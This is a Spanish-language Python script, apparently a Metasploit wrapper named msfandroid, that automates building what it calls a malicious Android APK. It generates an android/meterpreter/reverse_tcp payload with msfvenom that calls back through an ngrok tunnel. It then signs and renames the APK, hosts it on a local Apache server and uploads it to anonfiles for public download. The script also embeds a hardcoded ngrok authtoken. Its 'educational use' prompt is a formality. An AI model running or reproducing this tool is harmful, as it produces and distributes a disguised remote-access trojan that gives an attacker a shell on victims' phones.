#!/usr/bind/env python
#_*_ coding: utf8 _*_

from banner.banner import *
import os
import subprocess
import netifaces as net
import time
import requests

a = open(os.devnull,'w')

banner()
if input("\n\033[1;41;37mADVERTENCIA\033[0;m \033[1;33m¿Acepta utilizar esta herramienta con fines educativos?\033[0;m [\033[1;32my\033[0;m/\033[1;31mn\033[0;m]\n\n\033[1;37m>>\033[0;m ").upper() != "Y":
    os.system('clear') 
    print("\n\n\033[1;42;37mGOODBYE\033[0;m \033[1;31mLo siento, no puedo permitirte el acceso :P\033[0;m\n\n")
    time.sleep(0.8)
    exit(0)


def download_install_ngrok():
	try:
		banner()
		print("\n{}[*]................Descargando NGROK{}".format(YELLOW,END))
		p = subprocess.call(['wget','https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz'],stdout=a,stderr=subprocess.STDOUT)
		print("\n{}[✔]................Completado{}".format(GREEN,END))
		time.sleep(2)

		#UNPACKAGE
		print("\n{}[*]..................Desempaquetando NGROK{}".format(YELLOW,END))
		p = subprocess.call(['tar','zxvf','ngrok-stable-linux-amd64.tgz'],stdout=a,stderr=subprocess.STDOUT)
		print("\n{}[✔]................Completado{}".format(GREEN,END))
		time.sleep(2)

		#AUTHTOKEN
		print("\n{}[*]..................Autorizando NGROK{}".format(YELLOW,END))
		p = subprocess.call(['./ngrok','authtoken','24wJbevLjUhgcjJ42o9hlUqd4yj_7xxMsyxtTLp5FVySZYBEs'],stdout=a,stderr=subprocess.STDOUT)
		print("\n{}[✔]................Completado{}".format(GREEN,END))
		time.sleep(2)

	except FileNotFoundError:
		print("{}[ERROR]{} El fichero o directorio no existe".format(RED_NORMAL,END))	

banner()
print("\n#Comentario: es necesario instalar ngrok para la operación")
print("#en caso de tenerlo instalado, ejecutar '{}n{}' y proseguir".format(RED,END))
ngrok = input("{}¿Instalar ngrok?{} [{}y{}/{}n{}]: ".format(YELLOW,END,GREEN,END,RED,END))

if ngrok == 'y':
	download_install_ngrok()

	volver = input("¿Desea volver al menú principal? [{}y{}/{}n{}]: ".format(GREEN,END,RED,END))

	if volver == 'y':
		os.system('python3 msfandroid.py')
	else:
		print("\n{}[GOODBYE!]{} Saliendo del programa...".format(RED_NORMAL,END))
		exit(0)	

elif ngrok == 'n':
	banner()
	print("\n#Comentario: seleccione '{}y{}' para crear la APK o '{}n{}' para salir".format(GREEN,END,RED,END))
	apk = input("{}¿Crear APK maliciosa?{} [{}y{}/{}n{}]: ".format(YELLOW,END,GREEN,END,RED,END))

	if apk == 'y':
		interfaces = net.interfaces()
		def payload():
			for i in interfaces:
				if i != "lo":
					try:

						net.ifaddresses(i)
						ip = net.ifaddresses(i)[net.AF_INET][0]['addr']

						#APACHE2 START
						print("\n{}[*]................Inicio de servicio Apache2{}".format(YELLOW,END))
						p = subprocess.call(['service','apache2','start'],stdout=a,stderr=subprocess.STDOUT)
						print("\n{}[✔]................Completado{}".format(GREEN,END))

						#APK CREATING
						print("\n{}[*]................Crear APK{}".format(YELLOW,END))
						nombre_apk = input("{}Nombre ->>{} ".format(WHITE,END))
						alias = input("{}Alias {}(ej. {}hacking{}) ->> ".format(WHITE,END,WHITE,END))
						print("\n{}[*]................Ejecutando{} {}NGROK{} {}- Puerto:{}4444{}".format(YELLOW,END,GREEN,END,YELLOW,GREEN,END))
						xterm = os.system("xterm -e ./ngrok tcp 4444 2>&1 &")
						print("#Comentario: no cierre la terminal de ngrok")
						forwarding_ngrok = input("{}Forwarding ngrok {}(ej. {}0.tcp.ngrok.io{}) ->> ".format(WHITE,END,WHITE,END))
						port_ngrok = int(input("{}Port ngrok {}(ej. {}13467{}) ->> ".format(WHITE,END,WHITE,END)))
						print("{}IP Local ->>{} {}".format(WHITE,END,ip))
						print("\n{}[!]{}................{}Creando APK, aguarde un momento{}".format(RED,END,WHITE,END))
						os.system("\nmsfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R> {}.apk".format(forwarding_ngrok,port_ngrok,nombre_apk))
						print("{}[✔]................Completado{}".format(GREEN,END))
						print("\n{}[*]................Crear certificado - Keytool{}".format(YELLOW,END))						
						certificado = os.system("keytool -genkey -V -keystore key.keystore -alias {} -keyalg RSA -keysize 2048 -validity 10000".format(alias))
						print("\n{}[✔]................Completado{}".format(GREEN,END))
						print("\n{}[*]................Generar firma - Jarsigner{}".format(YELLOW,END))
						print("#Comentario: introduce la contraseña del certificado")
						firma = os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore {}.apk {}".format(nombre_apk,alias))
						print("\n{}[✔]................Completado{}".format(GREEN,END))
						print("\n{}[*]................Comprimir y alinear datos - Zipalign{}".format(YELLOW,END))
						renombrar_apk = input("{}Renombrar APK >>{} ".format(WHITE,END))
						datos = os.system("zipalign -v 4 {}.apk {}.apk".format(nombre_apk,renombrar_apk))
						print("\n{}[✔]................Completado{}".format(GREEN,END))
						print("\n{}[*]................Moviendo {}.apk al directiorio /var/www/html{}".format(YELLOW,renombrar_apk,END))
						mover_apk = os.system("mv {}.apk /var/www/html".format(renombrar_apk))

						# APK DOWNLOAD
						# API ANONFILE
						files = {
    						'file': (f'/var/www/html/{renombrar_apk}.apk', open(f'/var/www/html/{renombrar_apk}.apk', 'rb')),
						}
						url = 'https://api.anonfiles.com/upload'
						response = requests.post(url, files=files)
						data = response.json()

						print(f"{WHITE}Descargar APK{END} ({YELLOW}local{END}) ->> http://{ip}/{renombrar_apk}.apk")
						print(f"{WHITE}Descargar APK{END} ({GREEN}remoto{END}) ->> " + data['data']['file']['url']['short']) 
				 
					except:
						pass	

		payload()	

	elif apk == 'n':
		print("\n{}[GOODBYE!]{} Saliendo del programa...".format(RED_NORMAL,END))
		exit(0)

else:
	print("\n{}[ERROR!]{} Opción incorrecta, intente nuevamente".format(RED_NORMAL,END))
	time.sleep(1)
	exit(0)
